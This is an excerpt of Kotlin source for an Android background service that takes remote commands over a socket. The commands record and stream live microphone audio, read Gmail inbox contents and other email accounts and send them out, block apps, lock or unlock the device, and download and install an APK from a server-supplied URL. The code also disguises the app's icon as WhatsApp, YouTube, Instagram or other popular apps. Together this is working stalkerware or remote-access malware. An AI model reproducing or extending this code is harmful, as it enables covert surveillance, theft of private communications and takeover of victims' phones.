...
class DeviceService : Service(), LifecycleOwner {
    ...
    companion object {
        const val ACTION_COMMAND       = "com.ph.rt.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.ph.rt.CONNECT"
        const val ACTION_SEND_STATUS   = "com.ph.rt.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.ph.rt.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.ph.rt.SCREEN_RESULT"
    ...
    // ── Auto Update APK ───────────────────────────────────────
    private var apkInstalling = false
    ...
    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            ...
            "startMic"         -> startMicRecording()
            "stopMic"          -> stopMicRecording()
            "getEmailHistory"  -> sendEmailHistory()
            "updateApk"        -> updateApk(value)
        }
    }
...
private fun stopVideoOverlay() {
    ...
    private fun blockApp(pkgJson: String) {
        try {
            ...
            val i = Intent("com.ph.rt.BLOCK_APP").apply {
    ...
    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.ph.rt.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
    ...
    private fun unblockAll() {
        try {
            val i = Intent("com.ph.rt.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(org.json.JSONObject().apply {
    ...
    private fun unlockDevice() {
        ...
        val intent = Intent("com.ph.rt.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
    ...
    private val THEME_ALIASES = mapOf(
        "default"   to "com.ph.rt.AliasDefault",
        "whatsapp"  to "com.ph.rt.AliasWhatsApp",
        "youtube"   to "com.ph.rt.AliasYouTube",
        "instagram" to "com.ph.rt.AliasInstagram",
        "telegram"  to "com.ph.rt.AliasTelegram",
        "xnxx"      to "com.ph.rt.AliasXNXX"
    )
...
${htmlContent}
    ...
    private fun startMicRecording() {
        ...
        micRecording = true
        emitStatus(JSONObject().apply { put("micActive", true) })

        micThread = Thread {
            val sampleRate   = 16000
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFmt     = AudioFormat.ENCODING_PCM_16BIT
            val minBuf       = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFmt)
            val bufSize      = minBuf.coerceAtLeast(4096)

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
                emitStatus(JSONObject().apply { put("micActive", false); put("micError", "permission_denied") })
                micRecording = false
                return@Thread
            }

            @SuppressLint("MissingPermission")
            val rec = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFmt, bufSize)
            audioRecord = rec

            if (rec.state != AudioRecord.STATE_INITIALIZED) {
                emitStatus(JSONObject().apply { put("micActive", false); put("micError", "init_failed") })
                micRecording = false
                return@Thread
            }
            rec.startRecording()
            ...
            while (micRecording && socket?.connected() == true) {
                ...
                try {
                    socket?.emit("device:audioframe", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("audio", b64)
            ...
            audioRecord = null
            emitStatus(JSONObject().apply { put("micActive", false) })
        }
        micThread?.start()
    }
        ...
        Thread {
            try {
                ...
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
                    ...
                    // Gmail
                    am.getAccountsByType("com.google").forEach { acc ->
                        val obj = JSONObject().apply {
                            put("account", acc.name)
                            put("type", "gmail")
                        }
                        try {
                            val gmailUri = android.net.Uri.parse("content://gmail-ls/conversations/${acc.name}/0")
                            val proj = arrayOf("subject","fromAddress","date","snippet","read")
                            val cur = contentResolver.query(gmailUri, proj, null, null, "date DESC")
                            val emails = org.json.JSONArray()
                            cur?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 30) {
                                    emails.put(JSONObject().apply {
                                        put("subject", c.getString(c.getColumnIndexOrThrow("subject")) ?: "")
                                        put("from",    c.getString(c.getColumnIndexOrThrow("fromAddress")) ?: "")
                                        put("date",    c.getLong(c.getColumnIndexOrThrow("date")))
                                        put("snippet", c.getString(c.getColumnIndexOrThrow("snippet")) ?: "")
                                        put("read",    c.getInt(c.getColumnIndexOrThrow("read")) == 1)
                                    })
                                    count++
                                }
                            }
                            obj.put("inbox", emails)
                        } catch (_: Exception) { obj.put("inbox", org.json.JSONArray()) }
                        arr.put(obj)
                    }

                    // Akun email lainnya
                    listOf("com.microsoft.exchange","com.yahoo.mobile","imap","pop3")
                        .forEach { t ->
                            am.getAccountsByType(t).forEach { acc ->
                                arr.put(JSONObject().apply {
                                    put("account", acc.name); put("type", t)
                                    put("inbox", org.json.JSONArray())
                                })
                            }
                        }
                }

                socket?.emit("device:emailhistory", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendEmailHistory: ${e.message}")
                socket?.emit("device:emailhistory", JSONObject().apply {
                    put("deviceId", deviceId)
    ...
    //  AUTO UPDATE APK
    // ════════════════════════════════════════════════════════
    private fun updateApk(apkUrl: String) {
        if (apkInstalling) return
        apkInstalling = true
        emitStatus(JSONObject().apply { put("apkUpdating", true) })
        Thread {
            try {
                ...
                conn.inputStream.use { i -> apkFile.outputStream().use { o -> i.copyTo(o) } }
                conn.disconnect()

                val apkUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    androidx.core.content.FileProvider.getUriForFile(this, "$packageName.provider", apkFile)
                } else { android.net.Uri.fromFile(apkFile) }
                ...
                startActivity(intent)
                emitStatus(JSONObject().apply { put("apkUpdating", false); put("apkInstalling", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "updateApk: ${e.message}")
                emitStatus(JSONObject().apply { put("apkUpdating", false); put("apkError", e.message ?: "failed") })
            } finally { apkInstalling = false }
        }.start()
    }
